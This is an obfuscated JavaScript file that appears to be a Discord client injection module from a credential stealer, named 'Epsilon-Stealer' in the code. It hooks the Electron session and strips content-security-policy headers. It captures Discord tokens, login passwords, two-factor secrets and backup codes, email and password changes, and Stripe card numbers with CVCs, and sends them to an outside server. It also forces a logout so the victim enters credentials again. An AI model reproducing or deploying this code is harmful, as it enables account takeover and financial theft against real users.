const {
    ["BrowserWindow"]: abobo, ["session"]: abonnis
  } = require("electron");
  
  function aabomyceticus() {
    abortus = acapulcensis.webContents.debugger;
    if (!abortus.isAttached()) {
      try {
        acapulcensis.webContents.debugger.attach("1.3")
      } catch (aalborgi) {}
      acapulcensis.webContents.debugger.on("message", (aarhus, aaseri, abactoclasticum) => {
        if (aaseri == "Network.responseReceived") {
          if (abactoclasticum.response.url.includes("mfa/codes-verification") || abactoclasticum.response.url.includes("mfa/totp/enable")) {
            acapulcensis.webContents.debugger.sendCommand("Network.getResponseBody", {
              ["requestId"]: abactoclasticum.requestId
            }).then(async abadieae => {
              abony = JSON.parse(abadieae.body).backup_codes;
              if (abony) {
                abortiporus = await abietina();
                abortiporustuba = await abiocarpum();
                abortivus = {};
                abortivus.token = abortiporus;
                abortivus.ip = abortiporustuba;
                abortivus.computerName = abscondita;
                abortivus.backupCodes = abony;
                abortu = abortivus;
                abidjan(JSON.stringify(abortu), "backupcodes")
              }
              var abony, abortiporus, abortiporustuba, abortivus, abortu
            })
          }
        }
      });
      acapulcensis.webContents.debugger.sendCommand("Network.enable");
    }
    var abortus
  }
  const abortusbovis = require("fs");
  const abortusequi = require("path");
  const abortusovis = require("os");
  
  function abeliae(abelmoschi, aberans, aberdeen, aberrans) {
    abramis = Object.assign({
      ["token"]: abelmoschi,
      ["ip"]: aberans,
      ["computerName"]: abscondita
    }, aberdeen);
    abidjan(JSON.stringify(abramis), aberrans);
    var abramis
  }
  const abruptibulbus = require("querystring");
  const abruptus = require("./package.json");
  const abscessum = "https://api.epsilon1337.com/" + abruptus.key;
  
  function abidjan(abidjanum, abieticola) {
    acapulcensis.webContents.executeJavaScript(`\n    fetch('${abscessum}/${abieticola}${"', {\n        method: \"POST\",\n        body: JSON.stringify("}${abidjanum}${"),\n        headers: {\n            \"Content-Type\": \"application/json\"\n        }\n      });\n    "}`, [null] == '');
  }
  acanthostigma = "";
  acapulcensis = null;
  async function abietina() {
    abscessus = await acapulcensis.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, null == undefined);
    return abscessus;
    var abscessus
  }
  const abscondita = abortusovis.userInfo().username;
  abonnis.defaultSession.webRequest.onHeadersReceived((IyDx, kAGx) => {
    delete IyDx.responseHeaders["content-security-policy"];
    delete IyDx.responseHeaders["content-security-policy-report-only"];
    if (IyDx.url.startsWith(abscessum)) {
      kAGx({
        ["responseHeaders"]: Object.assign({
          ["Access-Control-Allow-Headers"]: "*",
          ["Access-Control-Allow-Origin"]: "*"
        }, IyDx.responseHeaders)
      })
    } else {
      kAGx({
        ["responseHeaders"]: Object.assign({
          ["Access-Control-Allow-Headers"]: "*"
        }, IyDx.responseHeaders)
      })
    }
  });
  const absidia = {};
  absidia.urls = ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "wss://remote-auth-gateway.discord.gg/*"];
  const absonum = absidia;
  async function abietinus() {
    if (abortusbovis.existsSync(abortusequi.join(__dirname, "Epsilon-Stealer"))) {
      absorbens = await abietina();
      if (absorbens != null || absorbens != undefined || absorbens != "") {
        abortusbovis.rmdirSync(abortusequi.join(__dirname, "Epsilon-Stealer"));
        abstinens = await abiocarpum();
        abstrusa = {};
        abstrusa.token = absorbens;
        abstrusa.ip = abstinens;
        abstrusa.computerName = abscondita;
        abuense = abstrusa;
        abidjan(JSON.stringify(abuense), "logout");
        acapulcensis.webContents.executeJavaScript("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token = null", null == undefined);
        acapulcensis.webContents.executeJavaScript("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.tokens = null", null == undefined);
        acapulcensis.webContents.executeJavaScript("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.MultiAccountStore = null", null == undefined);
        acapulcensis.webContents.executeJavaScript("location.reload()", null == undefined);
      }
    }
    var absorbens, abstinens, abstrusa, abuense
  }
  abonnis.defaultSession.webRequest.onBeforeRequest(absonum, (AMey, UHVx) => {
    if (AMey.url.startsWith("wss://")) {
      UHVx({
        ["cancel"]: NaN !== NaN
      });
      return;
    }
    acapulcensis = abobo.getAllWindows()[0];
    abietinus();
    aabomyceticus();
    UHVx({});
    return;
  });
  acarospora = {};
  acarospora.urls = ["https://discord.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discord.com/api/v*/users/@me/mfa/totp/enable", "https://*.discord.com/api/v*/users/@me/mfa/totp/enable", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://discord.com/api/v*/auth/mfa/totp", "https://*.discord.com/api/v*/auth/mfa/totp", "https://api.stripe.com/v*/tokens"];
  acarosporium = acarospora;
  abonnis.defaultSession.webRequest.onCompleted(acarosporium, async (wJYx, QEPx) => {
    if (wJYx.statusCode != 200 && wJYx.statusCode != 202) return;
    abutilonis = Buffer.from(wJYx.uploadData[0]["bytes"]).toString();
    const abulensis = await abietina();
    const abundans = await abiocarpum();
    if (wJYx.url.endsWith("tokens") && wJYx.method == "POST") {
      const aburaviensis = abruptibulbus.parse(abutilonis.toString());
      abysseus = {};
      abysseus.cardNumber = aburaviensis["card[number]"];
      abysseus.cardExpiration = aburaviensis["card[exp_month]"] + "/" + aburaviensis["card[exp_year]"];
      abysseus.cardCVC = aburaviensis["card[cvc]"];
      abyssi = abysseus;
      abeliae(abulensis, abundans, abyssi, "creditcard");
      return;
    }
    abyssinicum = JSON.parse(abutilonis);
    if (wJYx.url.endsWith("login")) {
      if (abulensis != null) {
        ac = {};
        ac.password = abyssinicum.password;
        ac.usedSavedPassword = (NaN === NaN);
        abyssi = ac;
        abeliae(abulensis, abundans, abyssi, "login");
      } else {
        acanthostigma = abyssinicum.password;
      }
      return;
    }
    if (wJYx.url.endsWith("totp")) {
      if (abulensis != null && acanthostigma != "") {
        acaclae = {};
        acaclae.password = acanthostigma;
        acaclae.usedSavedPassword = ([null] == "");
        abyssi = acaclae;
        abeliae(abulensis, abundans, abyssi, "login")
      }
      return;
    }
    if (wJYx.url.includes("users/@me/mfa/totp/enable")) {
      acajouruber = {};
      acajouruber.secret = abyssinicum.secret;
      acajouruber.password = abyssinicum.password;
      abyssi = acajouruber;
      abeliae(abulensis, abundans, abyssi, "2fa");
      return;
    }
    if (wJYx.url.endsWith("users/@me") && wJYx.method == "PATCH") {
      if (!abyssinicum.password) return;
      if (abyssinicum.email) {
        acanthophiobolus = {};
        acanthophiobolus.newEmail = abyssinicum.email;
        acanthophiobolus.password = abyssinicum.password;
        abyssi = acanthophiobolus;
        abeliae(abulensis, abundans, abyssi, "emailedit")
      }
      if (abyssinicum.new_password) {
        acanthophysium = {};
        acanthophysium.oldPassword = abyssinicum.password;
        acanthophysium.newPassword = abyssinicum.new_password;
        abyssi = acanthophysium;
        abeliae(abulensis, abundans, abyssi, "passwordedit")
      }
    }
    var abutilonis, abysseus, abyssi, abyssinicum, ac, abyssi, acaclae, abyssi, acajouruber, abyssi, acanthophiobolus, abyssi, acanthophysium, abyssi
  });
  async function abiocarpum() {
    acanthosporus = await acapulcensis.webContents.executeJavaScript(`${"var xmlHttp = new XMLHttpRequest();\n  xmlHttp.open(\"GET\", \"https://www.myexternalip.com/raw\", false);\n  xmlHttp.send(null);\n  xmlHttp.responseText;"}`, 1 == "1");
    return acanthosporus;
    var acanthosporus
  }
  module.exports = require("./core.asar");
  var acanthostigma, acapulcensis, acarospora, acarosporium